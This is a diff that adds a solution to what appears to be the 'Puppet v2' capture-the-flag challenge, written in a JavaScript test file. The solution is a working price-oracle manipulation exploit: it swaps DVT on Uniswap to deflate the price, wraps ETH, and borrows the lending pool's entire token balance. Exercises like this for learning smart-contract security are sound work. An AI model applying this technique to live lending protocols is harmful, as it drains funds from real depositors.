@@ -83,6 +83,45 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+         /** Attempt 1
+          * Similar to prev.
+          * 1. [X] Send all player's DVT to uniswap => devalueing DVT in WETH <-> DVT pair, and also giving us WETH to spend
+          * 2. [X] Convert ETH to WETH, cuz it's V2
+          * 3. [ ] Exch for million DVT.
+         */
+
+        console.log("DVT:", (await token.balanceOf(player.address)), "WETH:", (await weth.balanceOf(player.address)), "ETH:", (await player.getBalance()));
+
+        // 1. DVT -> WETH
+        const dvtToWeth = [ token.address, weth.address]; // from DVT to WETH.
+        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await uniswapRouter.connect(player).swapExactTokensForTokens(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            1,
+            dvtToWeth,
+            player.address,
+            (await ethers.provider.getBlock()).timestamp + 100010001000,
+        );
+
+        console.log("DVT:", (await token.balanceOf(player.address)), "WETH:", (await weth.balanceOf(player.address)), "ETH:", (await player.getBalance()));
+
+        // 2. ETH -> WETH
+        await player.sendTransaction({
+            to: weth.address,
+            value: ethers.utils.parseEther("19.9")
+        });
+
+        console.log("DVT:", (await token.balanceOf(player.address)), "WETH:", (await weth.balanceOf(player.address)), "ETH:", (await player.getBalance()));
+
+        // WETH -> DVT Attack
+        await weth.connect(player).approve(lendingPool.address, (await weth.balanceOf(player.address)))
+        await lendingPool.connect(player).borrow(
+            (await token.balanceOf(lendingPool.address)),
+        );
+
+        console.log("DVT:", (await token.balanceOf(player.address)), "WETH:", (await weth.balanceOf(player.address)), "ETH:", (await player.getBalance()));
+
     });
 
     after(async function () {
